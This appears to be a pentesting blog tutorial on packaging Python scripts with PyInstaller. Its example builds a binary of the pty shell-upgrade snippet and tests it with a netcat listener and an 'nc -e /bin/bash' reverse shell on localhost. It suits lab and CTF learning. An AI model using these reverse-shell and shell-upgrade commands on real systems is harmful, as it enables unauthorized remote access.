---
title: "Tutorial: Create Binary Versions of Python Tools"
date: 2021-01-14T15:34:30-04:00
categories:
  - tutorial
tags:
  - python
  - pentesting
  - tools
  - linux
  - windows
---

With **PyInstaller** you can create stand-alone binaries that run on machines that do not have Python installed.

On Linux it will create an executable ELF binary.  
On Windows it creates a P32 or P32+ exe.  

Despite the crude method of including an entire interpreter, the minimum file size for a 64bit ELF binary is around 4 MB and the Windows equivalent is around 7 MB. So only marginally worse than your average .NET Hello World /s.


## Cross-Compiling

Here comes the bad news, there is no cross-compiling build-in.  
If you want to create Windows binaries, then you will have to do so on Windows and the same is true for Linux.  

Also please note that it matter whether you use the 32bit or 64bit version of the Python interpreter. Using the 64bit Linux interpreter results in a 64bit ELF binary.

But I assume you have some VM's lying around that can be used.  
[Wine might also work](https://stackoverflow.com/a/35605479), but I have not tried that.


## Install

On linux you can just use `pip3 install PyInstaller` or `pip install PyInstaller` for the 2.7 version.

On Windows you can also use `python.exe -m pip install PyInstaller`.

I will use the 3+ version of Python for the following examples. But the process should be the same regardless of what version you use. Just make sure the Interpreter you use for compiling the binary is the same one the script would use.


## Example: Upgrade a Linux Reverse Shell

If you have done CTF's or network pentesting, then you have probably encountered this python snippet before: 

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This spawns a fully interactive psuedo-terminal that allows you to run commands such as `su` or `sudo`, which can be pretty handy if you were stuck with a semi-interactive reverse shell before.

There are other ways to spawn a fully-interactive shell besides python, but this will do as a simple example.

Let's create a standalone-binary version of this snippet.

First create a python script file `upgrade.py`:
```python
#!/usr/bin/env python3
import pty
pty.spawn("/bin/bash")
```

Use the following command in order to create a pyinstaller binary:

```bash
pyinstaller --onefile upgrade.py
```

The `--onefile` parameter tells pyinstaller that all libraries should be packed into the binary.

If this finishes successfully, then you will find the created binary in the /dist subfolder.

### Does It Work?

Make sure the created `upgrade` binary is executable (`chmod +x upgrade`).

Listen for a shell with netcat:

```bash
nc -vlnp 4455
```

We will simulate a reverse shell as user www-data using sudo.  
This of course assumes you have such a user on your system and the required sudo permissions.  

Do this in a second shell:
```bash
sudo -u www-data bash -c "/usr/bin/nc localhost 4455 -e /bin/bash"
```

In the first terminal you will receive the semi-interactive netcat reverse shell (added new lines for clarity):

```bash
$ nc -vlnp 4455
listening on [any] 4455 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33470

whoami
www-data

tty
not a tty

ls -l
total 4000
-rwxr-xr-x 1 kali kali 4092904 Jan 15 19:42 upgrade
```

Run our binary:

```bash
./upgrade
www-data@kali:/tmp/upgrade/dist$ tty
tty
/dev/pts/2
www-data@kali:/tmp/upgrade/dist$ 
www-data@kali:/tmp/upgrade/dist$ su kali
su kali
Password: hunter2

kali@kali:/tmp/upgrade/dist$
```

The `tty` command confirms our upgraded shell counts as a terminal. You should be able to do interactive commands like `su` now.